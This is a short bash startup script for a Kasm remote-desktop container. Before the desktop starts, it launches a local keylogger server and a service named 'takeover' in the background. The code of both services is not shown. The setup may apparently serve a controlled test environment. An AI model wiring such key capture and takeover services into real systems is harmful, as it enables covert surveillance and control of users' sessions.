#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Start local keylog server
# ===============================

if command -v node >/dev/null 2>&1; then
  if [ -f /usr/local/bin/keylog_server.js ]; then
    echo "[startup-wrapper] launching keylog_server.js on 127.0.0.1:3000"
    nohup node /usr/local/bin/keylog_server.js > /tmp/keylog_server.out 2>&1 &
    sleep 0.3
  fi
fi


echo "[startup] starting takeover service"
node /usr/local/bin/takeover.js &
TAKEOVER_PID=$!

# ===============================
# Start Kasm (WITHOUT exec)
# ===============================

if [ -x /dockerstartup/vnc_startup.sh ]; then
  echo "[startup-wrapper] starting Kasm via vnc_startup.sh"
  /dockerstartup/vnc_startup.sh /dockerstartup/kasm_startup.sh --wait &
  KASM_PID=$!
elif [ -x /dockerstartup/kasm_startup.sh ]; then
  echo "[startup-wrapper] starting Kasm directly"
  /dockerstartup/kasm_startup.sh --wait &
  KASM_PID=$!
else
  echo "[startup-wrapper] default startup not found"
  tail -f /dev/null
fi

# ===============================
# Wait for X server (:1)
# ===============================

echo "[startup-wrapper] Waiting for X server..."

until xdpyinfo -display :1 >/dev/null 2>&1; do
  sleep 0.5
done

echo "[startup-wrapper] X server ready"

# ===============================
# Wait on Kasm process
# ===============================

wait $KASM_PID
